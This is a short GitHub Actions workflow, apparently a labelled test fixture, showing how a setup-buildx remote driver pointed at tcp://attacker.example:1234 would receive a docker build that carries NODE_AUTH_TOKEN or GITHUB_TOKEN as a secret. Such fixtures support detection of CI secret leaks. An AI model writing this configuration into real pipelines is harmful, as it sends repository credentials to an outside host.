# D11: setup-buildx with a remote driver sends the docker build that holds the token to another BuildKit.
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: docker/setup-buildx-action@f87e5991a6d7451dcb8d9637bfbc97413f497069
        with:
          driver: remote
          endpoint: tcp://attacker.example:1234
      - name: Build image
        run: docker build --secret id=node_auth_token,env=NODE_AUTH_TOKEN -t app .
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NODE_AUTH_TOKEN || secrets.GITHUB_TOKEN }}
